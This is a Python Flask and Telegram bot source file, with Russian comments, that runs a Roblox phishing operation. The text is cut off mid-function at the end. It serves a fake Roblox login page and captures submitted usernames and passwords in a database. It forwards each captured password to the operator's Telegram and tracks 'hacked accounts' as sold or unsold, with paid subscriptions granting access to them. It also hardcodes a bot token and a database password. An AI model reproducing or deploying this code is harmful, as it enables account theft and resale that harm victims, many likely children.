from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
from datetime import datetime, timedelta

# === Основные настройки бота ===
TOKEN = '8028944732:AAEICb55rLpVYfL9vDul5aYPf_E19SPjMlo'  # Токен бота от BotFather
ADMIN_CHAT_ID = '6956377285'  # Chat ID создателя бота
DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'  # URL базы данных
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')  # URL сайта, по умолчанию Render

# === Инициализация Flask и Telebot ===
app = Flask(__name__)  # Создаем приложение Flask для обработки вебхуков
bot = telebot.TeleBot(TOKEN)  # Инициализируем бота с токеном

# === Глобальные переменные для состояния бота ===
tech_break = None  # Время окончания техперерыва
tech_reason = None  # Причина техперерыва
processed_updates = set()  # Множество обработанных update_id для предотвращения дубликатов
pending_hacked = {}  # Словарь для отслеживания процесса добавления в hacked
pending_support = {}  # Словарь для отслеживания процесса отправки сообщений в support

# === Функция для получения текущего времени с учетом часового пояса ===
def get_current_time():
    print("Получение текущего времени с учетом UTC+2")
    current_time = datetime.now()  # Получаем текущее время в UTC
    adjusted_time = current_time + timedelta(hours=2)  # Добавляем 2 часа для UTC+2
    print(f"Текущее время: {adjusted_time}")
    return adjusted_time

# === Функция для подключения к базе данных ===
def get_db_connection():
    print("Попытка подключения к базе данных")
    try:
        conn = psycopg2.connect(DATABASE_URL)  # Устанавливаем соединение с базой
        print("Подключение к БД успешно установлено")
        return conn
    except Exception as e:
        print(f"Ошибка подключения к БД: {e}")
        return None

# === Инициализация базы данных ===
def init_db():
    print("Инициализация базы данных")
    conn = get_db_connection()  # Получаем соединение
    if conn is None:
        print("Не удалось инициализировать БД - продолжаем без БД")
        return False
    try:
        c = conn.cursor()  # Создаем курсор для выполнения запросов
        print("Создаем таблицу 'users', если она не существует")
        c.execute('''CREATE TABLE IF NOT EXISTS users 
                     (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
        print("Создаем таблицу 'credentials', если она не существует")
        c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                     (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
        print("Создаем таблицу 'hacked_accounts', если она не существует")
        c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                     (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
        subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()  # Устанавливаем подписку на 10 лет для создателя
        print(f"Устанавливаем создателя для chat_id: {ADMIN_CHAT_ID}")
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = EXCLUDED.prefix, subscription_end = EXCLUDED.subscription_end",
                  (ADMIN_CHAT_ID, "Создатель", subscription_end))
        conn.commit()  # Подтверждаем изменения
        print("Коммит изменений в базе данных")
        conn.close()  # Закрываем соединение
        print("БД успешно инициализирована")
        return True
    except Exception as e:
        print(f"Ошибка инициализации БД: {e}")
        conn.close()
        return False

# === Функция для поддержания активности на Render ===
def keep_alive():
    print("Запуск функции keep_alive для поддержания активности")
    while True:
        try:
            print(f"Отправка GET-запроса на {SITE_URL}")
            response = requests.get(SITE_URL)  # Пингуем сайт
            print(f"🔁 Пинг: {response.status_code} - {response.text[:50]}")
        except Exception as e:
            print(f"Ошибка keep-alive: {e}")
        time.sleep(60)  # Ждем 60 секунд перед следующим пингом

# === Функция для получения данных пользователя из БД ===
def get_user(chat_id):
    print(f"Получение данных пользователя для chat_id: {chat_id}")
    conn = get_db_connection()
    if conn is None:
        print(f"Нет подключения к БД для chat_id: {chat_id}")
        if chat_id == ADMIN_CHAT_ID:
            print(f"Жестко задаем создателя для {chat_id}")
            return {
                'prefix': 'Создатель',
                'subscription_end': get_current_time() + timedelta(days=3650),
                'site_clicks': 0,
                'password_views': 0
            }
        return None
    try:
        c = conn.cursor()
        print(f"Выполнение запроса для получения данных пользователя {chat_id}")
        c.execute("SELECT prefix, subscription_end, site_clicks, password_views FROM users WHERE chat_id = %s", (chat_id,))
        result = c.fetchone()
        conn.close()
        if result:
            print(f"Пользователь {chat_id} найден: {result}")
            user_data = {
                'prefix': result[0],
                'subscription_end': datetime.fromisoformat(result[1]) if result[1] else None,
                'site_clicks': result[2],
                'password_views': result[3]
            }
            return user_data
        print(f"Пользователь {chat_id} не найден в базе")
        return None
    except Exception as e:
        print(f"Ошибка в get_user для {chat_id}: {e}")
        conn.close()
        return None

# === Функция для сохранения пользователя в БД ===
def save_user(chat_id, prefix, subscription_end=None):
    print(f"Сохранение пользователя {chat_id} с префиксом {prefix}")
    conn = get_db_connection()
    if conn is None:
        print(f"Не удалось сохранить пользователя {chat_id}: нет подключения к БД")
        return
    try:
        c = conn.cursor()
        if subscription_end is None:
            subscription_end = get_current_time().isoformat()
            print(f"Установка времени подписки по умолчанию: {subscription_end}")
        print(f"Выполнение SQL-запроса для сохранения пользователя {chat_id}")
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
                  (chat_id, prefix, subscription_end, prefix, subscription_end))
        conn.commit()
        print(f"Пользователь {chat_id} успешно сохранен")
        conn.close()
    except Exception as e:
        print(f"Ошибка сохранения пользователя {chat_id}: {e}")
        conn.close()

# === Функция для увеличения счетчика кликов на сайт ===
def increment_site_clicks(chat_id):
    print(f"Увеличение счетчика кликов на сайт для {chat_id}")
    conn = get_db_connection()
    if conn is None:
        print(f"Не удалось обновить клики для {chat_id}: нет подключения к БД")
        return
    try:
        c = conn.cursor()
        print(f"Выполнение SQL-запроса для увеличения site_clicks для {chat_id}")
        c.execute("UPDATE users SET site_clicks = site_clicks + 1 WHERE chat_id = %s", (chat_id,))
        conn.commit()
        print(f"Счетчик кликов увеличен для {chat_id}")
        conn.close()
    except Exception as e:
        print(f"Ошибка увеличения кликов для {chat_id}: {e}")
        conn.close()

# === Функция для увеличения счетчика просмотров паролей ===
def increment_password_views(chat_id):
    print(f"Увеличение счетчика просмотров паролей для {chat_id}")
    conn = get_db_connection()
    if conn is None:
        print(f"Не удалось обновить просмотры паролей для {chat_id}: нет подключения к БД")
        return
    try:
        c = conn.cursor()
        print(f"Выполнение SQL-запроса для увеличения password_views для {chat_id}")
        c.execute("UPDATE users SET password_views = password_views + 1 WHERE chat_id = %s", (chat_id,))
        conn.commit()
        print(f"Счетчик просмотров паролей увеличен для {chat_id}")
        conn.close()
    except Exception as e:
        print(f"Ошибка увеличения просмотров паролей для {chat_id}: {e}")
        conn.close()

# === Функция для сохранения учетных данных ===
def save_credentials(login, password):
    print(f"Сохранение учетных данных: login={login}, password={password}")
    conn = get_db_connection()
    if conn is None:
        print("Не удалось сохранить учетные данные: нет подключения к БД")
        return False
    try:
        c = conn.cursor()
        added_time = get_current_time().isoformat()
        print(f"Время добавления учетных данных: {added_time}")
        c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
                  "ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
                  (login, password, added_time, password, added_time))
        conn.commit()
        print(f"Учетные данные успешно сохранены: login={login}")
        conn.close()
        return True
    except Exception as e:
        print(f"Ошибка сохранения учетных данных: {e}")
        conn.close()
        return False

# === Функция для удаления учетных данных ===
def delete_credentials(login):
    print(f"Удаление учетных данных для login: {login}")
    conn = get_db_connection()
    if conn is None:
        print("Не удалось удалить учетные данные: нет подключения к БД")
        return False
    try:
        c = conn.cursor()
        print(f"Выполнение SQL-запроса для удаления login: {login}")
        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
        conn.commit()
        print(f"Учетные данные успешно удалены: login={login}")
        conn.close()
        return True
    except Exception as e:
        print(f"Ошибка удаления учетных данных: {e}")
        conn.close()
        return False

# === Функция для сохранения взломанного аккаунта ===
def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
    print(f"Сохранение взломанного аккаунта: login={login}")
    conn = get_db_connection()
    if conn is None:
        print("Не удалось сохранить взломанный аккаунт: нет подключения к БД")
        return False
    try:
        c = conn.cursor()
        hack_date = get_current_time().isoformat()
        print(f"Дата взлома: {hack_date}")
        c.execute("INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) "
                  "VALUES (%s, %s, %s, %s, %s, %s) "
                  "ON CONFLICT (login) DO UPDATE SET password = %s, hack_date = %s, prefix = %s, sold_status = %s, linked_chat_id = %s",
                  (login, password, hack_date, prefix, sold_status, linked_chat_id,
                   password, hack_date, prefix, sold_status, linked_chat_id))
        conn.commit()
        print(f"Взломанный аккаунт сохранен: login={login}, sold_status={sold_status}")
        conn.close()
        return True
    except Exception as e:
        print(f"Ошибка сохранения взломанного аккаунта: {e}")
        conn.close()
        return False

# === Функция для удаления взломанного аккаунта ===
def delete_hacked_account(login):
    print(f"Удаление взломанного аккаунта для login: {login}")
    conn = get_db_connection()
    if conn is None:
        print("Не удалось удалить взломанный аккаунт: нет подключения к БД")
        return False
    try:
        c = conn.cursor()
        print(f"Выполнение SQL-запроса для удаления login: {login}")
        c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
        conn.commit()
        print(f"Взломанный аккаунт успешно удален: login={login}")
        conn.close()
        return True
    except Exception as e:
        print(f"Ошибка удаления взломанного аккаунта: {e}")
        conn.close()
        return False

# === Функция для получения списка учетных данных ===
def get_credentials():
    print("Получение списка учетных данных")
    conn = get_db_connection()
    if conn is None:
        print("Не удалось получить учетные данные: нет подключения к БД")
        return []
    try:
        c = conn.cursor()
        print("Выполнение SQL-запроса для получения учетных данных")
        c.execute("SELECT login, password, added_time FROM credentials")
        result = c.fetchall()
        conn.close()
        print(f"Учетные данные получены: {result}")
        return result
    except Exception as e:
        print(f"Ошибка получения учетных данных: {e}")
        conn.close()
        return []

# === Функция для получения списка взломанных аккаунтов ===
def get_hacked_accounts():
    print("Получение списка взломанных аккаунтов")
    conn = get_db_connection()
    if conn is None:
        print("Не удалось получить взломанные аккаунты: нет подключения к БД")
        return []
    try:
        c = conn.cursor()
        print("Выполнение SQL-запроса для получения взломанных аккаунтов")
        c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
        result = c.fetchall()
        conn.close()
        print(f"Взломанные аккаунты получены: {result}")
        return result
    except Exception as e:
        print(f"Ошибка получения взломанных аккаунтов: {e}")
        conn.close()
        return []

# === Функция для получения списка всех пользователей ===
def get_all_users():
    print("Получение списка всех пользователей")
    conn = get_db_connection()
    if conn is None:
        print("Не удалось получить пользователей: нет подключения к БД")
        return []
    try:
        c = conn.cursor()
        print("Выполнение SQL-запроса для получения всех пользователей")
        c.execute("SELECT chat_id, prefix, subscription_end, site_clicks, password_views FROM users")
        result = c.fetchall()
        conn.close()
        print(f"Все пользователи получены: {result}")
        return result
    except Exception as e:
        print(f"Ошибка получения всех пользователей: {e}")
        conn.close()
        return []

# === Функция для форматирования времени с минутами ===
def format_time_with_minutes(iso_time):
    print(f"Форматирование времени: {iso_time}")
    added_time = datetime.fromisoformat(iso_time)
    current_time = get_current_time()
    minutes_passed = int((current_time - added_time).total_seconds() / 60)
    formatted_time = f"{added_time.strftime('%Y-%m-%d %H:%M')} ({minutes_passed} мин назад)"
    print(f"Отформатированное время: {formatted_time}")
    return formatted_time

# === Функция проверки доступа ===
def check_access(chat_id, command):
    print(f"Проверка доступа для {chat_id} на команду {command}")
    global tech_break, tech_reason
    user = get_user(chat_id)
    if user is None and command in ['start', 'menu', 'getchatid', 'support']:
        print(f"Пользователь {chat_id} не найден, сохраняем как Посетитель")
        save_user(chat_id, "Посетитель")
        user = get_user(chat_id)
    
    if tech_break and chat_id != ADMIN_CHAT_ID:
        time_left = (tech_break - get_current_time()).total_seconds() / 60
        if time_left > 0:
            print(f"Техперерыв активен для {chat_id}, время осталось: {time_left} мин")
            return f"⏳ Техперерыв до {tech_break.strftime('%H:%M')} (UTC+2).\nПричина: {tech_reason}\nОсталось: {int(time_left)} мин."
    if not user or user['prefix'] == 'Посетитель':
        if command in ['start', 'menu', 'getchatid', 'support']:
            print(f"Доступ для {chat_id} на {command} разрешен как Посетителю")
            return None
        print(f"Доступ для {chat_id} на {command} ограничен")
        return "🔒 Доступ ограничен!\nКупите подписку у @sacoectasy.\nВаш ID: /getchatid"
    if user['subscription_end'] and user['subscription_end'] < get_current_time():
        print(f"Подписка пользователя {chat_id} истекла")
        save_user(chat_id, 'Посетитель', get_current_time())
        return "🔒 Подписка истекла!\nОбновите подписку у @sacoectasy.\nВаш ID: /getchatid"
    if command in ['passwords', 'admin'] and user['prefix'] not in ['Админ', 'Создатель']:
        print(f"Команда {command} недоступна для {chat_id} с префиксом {user['prefix']}")
        return "🔒 Команда только для Админов и Создателя!"
    if command in ['hacked', 'database', 'techstop', 'techstopoff', 'adprefix', 'delprefix'] and user['prefix'] != 'Создатель':
        print(f"Команда {command} недоступна для {chat_id} с префиксом {user['prefix']}")
        return "🔒 Команда только для Создателя!"
    print(f"Доступ разрешен для {chat_id} на {command}")
    return None

# === Flask маршруты ===
@app.route('/')
def index():
    print("Обработка запроса на главную страницу")
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    print("Обработка запроса на страницу логина")
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    print("Обработка POST-запроса на /submit")
    try:
        login = request.form.get('login')
        password = request.form.get('password')
        print(f"Получены данные: login={login}, password={password}")
        if login and password:
            if save_credentials(login, password):
                print(f"Отправка сообщения создателю о новом логине: {login}")
                bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин добавлен:\nЛогин: {login}\nПароль: {password}")
        return redirect(url_for('not_found'))
    except Exception as e:
        print(f"Ошибка в /submit: {e}")
        return "Внутренняя ошибка сервера", 500

@app.route('/404')
def not_found():
    print("Обработка запроса на страницу 404")
    return render_template('404.html')

@app.route('/webhook', methods=['POST'])
def webhook():
    print("Получен запрос на /webhook")
    try:
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            print(f"Получены данные вебхука: {json_string}")
            update = telebot.types.Update.de_json(json_string)
            if update and (update.message or update.callback_query):
                update_id = update.update_id
                if update_id in processed_updates:
                    print(f"Повторный update_id: {update_id}, пропускаем")
                    return 'OK', 200
                processed_updates.add(update_id)
                print(f"Обработка обновления: {update}")
                bot.process_new_updates([update])
                print("Обновление успешно обработано")
            return 'OK', 200
        print("Неверный тип запроса")
        return 'Неверный запрос', 400
    except Exception as e:
        print(f"Ошибка в вебхуке: {e}")
        return 'OK', 200

# === Обработчики команд бота ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /start для chat_id: {chat_id}")
    access = check_access(chat_id, 'start')
    if access:
        print(f"Доступ ограничен для /start: {access}")
        bot.reply_to(message, access)
        return
    print(f"Отправка приветственного сообщения для {chat_id}")
    bot.reply_to(message, "✨ Добро пожаловать!\nЯ бот для управления доступом и данными.\n📋 Используйте /menu для списка команд.")

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /getchatid для chat_id: {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        print(f"Доступ ограничен для /getchatid: {access}")
        bot.reply_to(message, access)
        return
    username = message.from_user.username or "Нет юзернейма"
    print(f"Получен юзернейм: {username}")
    response = f"👤 Ваш Chat ID: `{chat_id}`\nЮзернейм: @{username}"
    bot.reply_to(message, response, parse_mode='Markdown')
    print(f"Отправлен ответ на /getchatid для {chat_id}")

@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /site для chat_id: {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        print(f"Доступ ограничен для /site: {access}")
        bot.reply_to(message, access)
        return
    increment_site_clicks(chat_id)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🌐 Перейти на сайт", url=SITE_URL))
    print(f"Отправка ссылки на сайт для {chat_id}")
    bot.reply_to(message, "🔗 Получите доступ к нашему сайту:", reply_markup=markup)
    print(f"Ответ на /site отправлен для {chat_id}")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /menu для chat_id: {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        print(f"Доступ ограничен для /menu: {access}")
        bot.reply_to(message, access)
        return
    
    user = get_user(chat_id)
    if not user:
        print(f"Ошибка: пользователь {chat_id} не найден")
        bot.reply_to(message, "❌ Ошибка: пользователь не найден!")
        return
    print(f"Пользователь {chat_id} найден: {user}")
    time_left = (user['subscription_end'] - get_current_time()).days if user['subscription_end'] else 0
    time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
    response = f"👤 Ваш статус: {user['prefix']}\n⏳ Подписка активна: {time_str}"
    
    global tech_break, tech_reason
    if tech_break:
        tech_time_left = (tech_break - get_current_time()).total_seconds() / 60
        if tech_time_left > 0:
            print(f"Техперерыв активен, осталось: {tech_time_left} мин")
            response += f"\n⏳ Техперерыв до {tech_break.strftime('%H:%M')} (UTC+2)\nПричина: {tech_reason}\nОсталось: {int(tech_time_left)} мин."
        else:
            print("Техперерыв истек, сбрасываем")
            tech_break = None
            tech_reason = None
    
    response += "\n\n📋 **Команды бота**:\n" \
                "/start — запустить бота\n" \
                "/menu — показать это меню\n" \
                "/getchatid — узнать ваш ID и юзернейм\n" \
                "/support — сообщить об ошибке создателю"
    if user['prefix'] != 'Посетитель':
        response += "\n/site — получить ссылку на сайт\n" \
                    "/hacked — список взломанных аккаунтов"
    if user['prefix'] in ['Админ', 'Создатель']:
        response += "\n/passwords — список паролей\n" \
                    "/admin — панель администратора"
    if user['prefix'] == 'Создатель':
        response += "\n/database — управление базой данных\n" \
                    "/techstop <минуты> <причина> — включить техперерыв\n" \
                    "/techstopoff — выключить техперерыв\n" \
                    "/adprefix <chat_id> <префикс> <дни> — выдать подписку\n" \
                    "/delprefix <chat_id> — сбросить подписку\n" \
                    "/adduser <chat_id> <префикс> <дни> — добавить пользователя\n" \
                    "/addcred <логин> <пароль> — добавить пароль\n" \
                    "/addhacked <логин> <пароль> — добавить взломанный аккаунт"
    
    print(f"Отправка ответа на /menu для {chat_id}")
    bot.reply_to(message, response, parse_mode='Markdown')
    print(f"Ответ на /menu успешно отправлен для {chat_id}")

@bot.message_handler(commands=['support'])
def support_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /support для chat_id: {chat_id}")
    access = check_access(chat_id, 'support')
    if access:
        print(f"Доступ ограничен для /support: {access}")
        bot.reply_to(message, access)
        return
    print(f"Запрос описания проблемы для {chat_id}")
    msg = bot.reply_to(message, "📩 Опишите проблему или баг, который вы нашли.\nСообщение будет отправлено создателю (@sacoectasy).")
    pending_support[chat_id] = {'step': 'awaiting_message', 'message_id': msg.message_id}
    print(f"Ожидание ввода сообщения от {chat_id}")

@bot.message_handler(func=lambda message: str(message.chat.id) in pending_support)
def handle_support_input(message):
    chat_id = str(message.chat.id)
    print(f"Обработка ввода для /support от chat_id: {chat_id}")
    if chat_id not in pending_support:
        print(f"Нет активного процесса /support для {chat_id}")
        return
    
    data = pending_support[chat_id]
    if data['step'] == 'awaiting_message':
        support_message = message.text.strip()
        username = message.from_user.username or "Нет юзернейма"
        print(f"Получено сообщение от {chat_id}: {support_message}")
        bot.send_message(ADMIN_CHAT_ID, f"📬 Сообщение от @{username} (ID: {chat_id}):\n\n{support_message}")
        bot.reply_to(message, "✅ Ваше сообщение отправлено создателю (@sacoectasy)!")
        print(f"Сообщение отправлено создателю от {chat_id}")
        del pending_support[chat_id]
        print(f"Процесс /support завершен для {chat_id}")

@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /techstop для chat_id: {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        print(f"Доступ ограничен для /techstop: {access}")
        bot.reply_to(message, access)
        return
    global tech_break, tech_reason
    args = message.text.split(maxsplit=2)[1:] if len(message.text.split()) > 1 else []
    if len(args) < 2 or not args[0].isdigit():
        print("Неверный формат команды /techstop")
        bot.reply_to(message, "❌ Формат: /techstop <минуты> <причина>\nПример: /techstop 30 Обновление")
        return
    minutes = int(args[0])
    reason = args[1]
    tech_break = get_current_time() + timedelta(minutes=minutes)
    tech_reason = reason
    print(f"Техперерыв установлен на {minutes} минут с причиной: {reason}")
    bot.reply_to(message, f"⏳ Техперерыв на {minutes} мин установлен!\nОкончание: {tech_break.strftime('%H:%M')} (UTC+2)\nПричина: {reason}")

@bot.message_handler(commands=['techstopoff'])
def techstopoff_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /techstopoff для chat_id: {chat_id}")
    access = check_access(chat_id, 'techstopoff')
    if access:
        print(f"Доступ ограничен для /techstopoff: {access}")
        bot.reply_to(message, access)
        return
    global tech_break, tech_reason
    tech_break = None
    tech_reason = None
    print("Техперерыв отключен")
    bot.reply_to(message, "✅ Техперерыв успешно отключен!")

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /passwords для chat_id: {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        print(f"Доступ ограничен для /passwords: {access}")
        bot.reply_to(message, access)
        return
    increment_password_views(chat_id)
    credentials = get_credentials()
    if not credentials:
        print("Список паролей пуст")
        bot.reply_to(message, "📂 Список паролей пуст.\nДобавьте через /addcred <логин> <пароль>.")
        return
    print(f"Получен список учетных данных: {credentials}")
    for i, (login, password, added_time) in enumerate(credentials, 1):
        formatted_time = format_time_with_minutes(added_time)
        response = f"**Пароль #{i}**\n👤 Логин: `{login}`\n🔒 Пароль: `{password}`\n⏰ Добавлен: {formatted_time}"
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton(f"🗑 Удалить #{i}", callback_data=f"delete_cred_{login}"),
            types.InlineKeyboardButton(f"🔓 Взломать #{i}", callback_data=f"hack_cred_{login}_{chat_id}")
        )
        print(f"Отправка сообщения для пароля #{i} для {chat_id}")
        bot.send_message(chat_id, response, reply_markup=markup, parse_mode='Markdown')
    print(f"Все пароли отправлены для {chat_id}")

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /hacked для chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        print(f"Доступ ограничен для /hacked: {access}")
        bot.reply_to(message, access)
        return
    
    hacked_accounts = get_hacked_accounts()
    if not hacked_accounts:
        markup = types.InlineKeyboardMarkup()
        if get_user(chat_id)['prefix'] == 'Создатель':
            markup.add(types.InlineKeyboardButton("➕ Добавить аккаунт", callback_data="add_hacked"))
        print("Список взломанных аккаунтов пуст")
        bot.reply_to(message, "📂 Список взломанных аккаунтов пуст.\nДобавьте через /addhacked или кнопку ниже.", reply_markup=markup)
        return
    
    response = "🔓 **Взломанные аккаунты**:\n"
    markup = types.InlineKeyboardMarkup()
    print(f"Получен список взломанных аккаунтов: {hacked_accounts}")
    for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
        formatted_time = format_time_with_minutes(hack_date)
        response += (f"👤 Логин: `{login}`\n"
                     f"🔒 Пароль: `{password}`\n"
                     f"⏰ Дата: {formatted_time}\n"
                     f"👑 Префикс: {prefix}\n"
                     f"💰 Статус: {sold_status}\n"
                     f"🆔 Chat ID: {linked_chat_id or 'Не привязан'}\n\n")
        if get_user(chat_id)['prefix'] == 'Создатель':
            markup.add(
                types.InlineKeyboardButton(f"🗑 Удалить", callback_data=f"delete_hacked_{login}")
            )
    if get_user(chat_id)['prefix'] == 'Создатель':
        markup.add(types.InlineKeyboardButton("➕ Добавить аккаунт", callback_data="add_hacked"))
    print(f"Отправка списка взломанных аккаунтов для {chat_id}")
    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['addhacked'])
def add_hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /addhacked для chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        print(f"Доступ ограничен для /addhacked: {access}")
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 2:
        print("Неверный формат команды /addhacked")
        bot.reply_to(message, "❌ Формат: /addhacked <логин> <пароль>\nПример: /addhacked test test123")
        return
    login, password = args[0], args[1]
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("💰 Продан", callback_data=f"hack_{login}_{password}_Продан_{chat_id}"),
        types.InlineKeyboardButton("📦 Не продан", callback_data=f"hack_{login}_{password}_Не продан_{chat_id}")
    )
    print(f"Запрос статуса для {login} от {chat_id}")
    bot.reply_to(message, f"🔓 Укажите статус для `{login}`:", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /admin для chat_id: {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        print(f"Доступ ограничен для /admin: {access}")
        bot.reply_to(message, access)
        return
    users = get_all_users()
    if not users:
        print("Список пользователей пуст")
        bot.reply_to(message, "📂 Список пользователей пуст.")
        return
    response = "👑 **Панель администратора**\n📋 Список пользователей:\n\n"
    print(f"Получен список пользователей: {users}")
    for chat_id_user, prefix, subscription_end, site_clicks, password_views in users:
        try:
            print(f"Получение информации о пользователе {chat_id_user}")
            user_info = bot.get_chat(chat_id_user)
            username = f"@{user_info.username}" if user_info.username else "Нет юзернейма"
            print(f"Юзернейм для {chat_id_user}: {username}")
        except Exception as e:
            print(f"Ошибка получения юзернейма для {chat_id_user}: {e}")
            username = "Ошибка получения"
        time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
        response += (f"🆔 Chat ID: `{chat_id_user}`\n"
                     f"👤 Юзернейм: {username}\n"
                     f"👑 Префикс: {prefix}\n"
                     f"⏳ Подписка: {time_left} дней\n"
                     f"🌐 Кликов на сайт: {site_clicks or 0}\n"
                     f"🔑 Просмотров паролей: {password_views or 0}\n\n")
    print(f"Отправка ответа на /admin для {chat_id}")
    bot.reply_to(message, response, parse_mode='Markdown')
    print(f"Ответ на /admin отправлен для {chat_id}")

@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /adprefix для chat_id: {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        print(f"Доступ ограничен для /adprefix: {access}")
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) < 3 or not args[2].isdigit():
        print("Неверный формат команды /adprefix")
        bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <префикс> <дни>\nПример: /adprefix 123456789 Админ 30")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    if prefix not in ["Админ", "Пользователь"]:
        print(f"Недопустимый префикс: {prefix}")
        bot.reply_to(message, "❌ Префикс должен быть: Админ или Пользователь!")
        return
    subscription_end = get_current_time() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    print(f"Префикс {prefix} выдан для {target_chat_id} на {days} дней")
    bot.reply_to(message, f"✅ Пользователю `{target_chat_id}` выдан префикс `{prefix}` на {days} дней!", parse_mode='Markdown')

@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /delprefix для chat_id: {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        print(f"Доступ ограничен для /delprefix: {access}")
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args:
        print("Неверный формат команды /delprefix")
        bot.reply_to(message, "❌ Формат: /delprefix <chat_id>\nПример: /delprefix 123456789")
        return
    target_chat_id = args[0]
    save_user(target_chat_id, "Посетитель", get_current_time())
    print(f"Префикс сброшен для {target_chat_id}")
    bot.reply_to(message, f"✅ Префикс пользователя `{target_chat_id}` сброшен до `Посетитель`!", parse_mode='Markdown')

@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /database для chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        print(f"Доступ ограничен для /database: {access}")
        bot.reply_to(message, access)
        return
    
    response = "📊 **Управление базой данных**\n\n"
    users = get_all_users()
    response += "👤 **Пользователи**:\n"
    if not users:
        response += "Список пуст\n"
    else:
        for chat_id_user, prefix, subscription_end, site_clicks, password_views in users:
            time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
            response += f"🆔 `{chat_id_user}` | 👑 {prefix} | ⏳ {time_left} дней\n"
    
    credentials = get_credentials()
    response += "\n🔑 **Пароли**:\n"
    if not credentials:
        response += "Список пуст\n"
    else:
        for login, password, added_time in credentials:
            formatted_time = format_time_with_minutes(added_time)
            response += f"👤 `{login}` | 🔒 `{password}` | ⏰ {formatted_time}\n"
    
    hacked_accounts = get_hacked_accounts()
    response += "\n🔓 **Взломанные аккаунты**:\n"
    if not hacked_accounts:
        response += "Список пуст\n"
    else:
        for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
            formatted_time = format_time_with_minutes(hack_date)
            response += f"👤 `{login}` | 🔒 `{password}` | ⏰ {formatted_time} | 💰 {sold_status}\n"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
